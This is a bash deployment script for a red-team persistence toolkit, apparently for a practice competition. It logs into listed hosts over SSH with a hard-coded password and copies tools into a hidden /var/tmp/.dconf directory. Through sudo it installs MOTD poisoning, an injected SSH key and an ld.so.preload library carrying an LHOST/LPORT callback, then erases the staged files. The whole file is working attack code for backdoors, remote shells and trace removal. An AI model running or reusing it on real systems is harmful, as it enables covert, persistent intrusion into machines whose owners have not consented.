#!/usr/bin/env bash

set -uo pipefail

# =============================================================================
# deploy.sh — Red Team Persistence Deployment Wrapper
#
# Usage:
#   ./deploy.sh
#
# Fill in the CONFIG section before running. This script will:
#   1. Compile the ld.so.preload shared library locally
#   2. For each target:
#       a. SCP toolkit files to /tmp/
#       b. Install MOTD persistence
#       c. Inject SSH authorized_keys
#       d. Install ld.so.preload persistence
#       e. Clean up /tmp/ files
# =============================================================================

# ── CONFIG — fill these in on comp day ───────────────────────────────────────

TARGETS=(
    "192.168.75.129"
    # "192.168.x.x"
    # "192.168.x.x"
    # "192.168.x.x"
    # "192.168.x.x"
)

USER="target"
PASSWORD="targetvm"
LHOST="192.168.75.130"
LPORT="4444"
SSH_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdfRaX3m4g2IxRAU13/phGVXk4cZqcB0Y1FHCCaz4hW chris@kali"

# ── END CONFIG ────────────────────────────────────────────────────────────────

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Files to transfer to each target
TOOLKIT_FILES=(
    "${SCRIPT_DIR}/obfuscate.sh"
    "${SCRIPT_DIR}/motd_poison.sh"
    "${SCRIPT_DIR}/ssh_inject.sh"
    "${SCRIPT_DIR}/ld_install.sh"
)

SO_FILE="${SCRIPT_DIR}/libdconf-update.so"

# ── Helpers ───────────────────────────────────────────────────────────────────

info()    { echo "[*] $*"; }
success() { echo "[+] $*"; }
warn()    { echo "[!] $*"; }
error()   { echo "[-] $*" >&2; }

# ── Preflight checks ──────────────────────────────────────────────────────────

if [[ -z "$USER" || -z "$PASSWORD" || -z "$LHOST" || -z "$SSH_PUBKEY" ]]; then
    error "CONFIG is incomplete. Fill in USER, PASSWORD, LHOST, and SSH_PUBKEY before running."
    exit 1
fi

if [[ "${#TARGETS[@]}" -eq 0 ]]; then
    error "No targets defined. Add target IPs to the TARGETS array."
    exit 1
fi

if ! command -v sshpass &>/dev/null; then
    error "sshpass is not installed. Install with: sudo apt install sshpass"
    exit 1
fi

if ! command -v gcc &>/dev/null; then
    error "gcc is not installed. Install with: sudo apt install gcc"
    exit 1
fi

# ── SSH/SCP helpers ───────────────────────────────────────────────────────────

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"

run_ssh() {
    local target="$1"
    local cmd="$2"
    sshpass -p "$PASSWORD" ssh $SSH_OPTS "${USER}@${target}" "$cmd"
}

run_scp() {
    local target="$1"
    shift
    sshpass -p "$PASSWORD" scp $SSH_OPTS "$@" "${USER}@${target}:/var/tmp/.dconf/"
}

# ── Step 1: Compile .so locally ───────────────────────────────────────────────

info "Compiling ld.so.preload shared library..."

if LHOST="$LHOST" LPORT="$LPORT" bash "${SCRIPT_DIR}/ld_gen.sh"; then
    success "Compiled ${SO_FILE}"
else
    error "Compilation failed — ld.so.preload will not be deployed"
    SO_FILE=""
fi

echo ""

# ── Step 2: Deploy to each target ────────────────────────────────────────────

for TARGET in "${TARGETS[@]}"; do
    echo "============================================================"
    info "Deploying to ${TARGET}"
    echo "============================================================"

    # ── Transfer toolkit files ────────────────────────────────────────────

    info "[${TARGET}] Transferring toolkit files..."

    TRANSFER_FILES=("${TOOLKIT_FILES[@]}")
    [[ -n "$SO_FILE" ]] && TRANSFER_FILES+=("$SO_FILE")

    if run_ssh "$TARGET" "mkdir -p /var/tmp/.dconf && chmod 700 /var/tmp/.dconf" 2>/dev/null && \
       run_scp "$TARGET" "${TRANSFER_FILES[@]}"; then
        success "[${TARGET}] Transfer complete"
    else
        error "[${TARGET}] Transfer failed — skipping this host"
        continue
    fi

    # ── MOTD persistence ──────────────────────────────────────────────────

    info "[${TARGET}] Installing MOTD persistence..."

    if sshpass -p "$PASSWORD" ssh $SSH_OPTS "${USER}@${TARGET}" \
        "echo '${PASSWORD}' | sudo -S LHOST='${LHOST}' LPORT='${LPORT}' bash /var/tmp/.dconf/motd_poison.sh" \
        2>/dev/null; then
        success "[${TARGET}] MOTD installed"
    else
        warn "[${TARGET}] MOTD install failed or already exists"
    fi

    # ── SSH key injection ─────────────────────────────────────────────────

    info "[${TARGET}] Injecting SSH key..."

    if run_ssh "$TARGET" "SSH_PUBKEY='${SSH_PUBKEY}' bash /var/tmp/.dconf/ssh_inject.sh" \
        2>/dev/null; then
        success "[${TARGET}] SSH key injected"
    else
        warn "[${TARGET}] SSH key injection failed or already exists"
    fi

    # ── ld.so.preload ─────────────────────────────────────────────────────

    if [[ -n "$SO_FILE" ]]; then
        info "[${TARGET}] Installing ld.so.preload persistence..."

        if sshpass -p "$PASSWORD" ssh $SSH_OPTS "${USER}@${TARGET}" \
            "echo '${PASSWORD}' | sudo -S LHOST='${LHOST}' LPORT='${LPORT}' bash /var/tmp/.dconf/ld_install.sh" \
            2>/dev/null; then
            success "[${TARGET}] ld.so.preload installed"
        else
            warn "[${TARGET}] ld.so.preload install failed or already exists"
        fi
    else
        warn "[${TARGET}] Skipping ld.so.preload — .so was not compiled"
    fi

    # ── Cleanup ───────────────────────────────────────────────────────────

    info "[${TARGET}] Cleaning up /tmp/..."

    run_ssh "$TARGET" "rm -rf /var/tmp/.dconf" \
        2>/dev/null && success "[${TARGET}] Cleanup complete" || warn "[${TARGET}] Cleanup may have partially failed"

    echo ""
done

echo "============================================================"
success "Deployment complete"
echo "============================================================"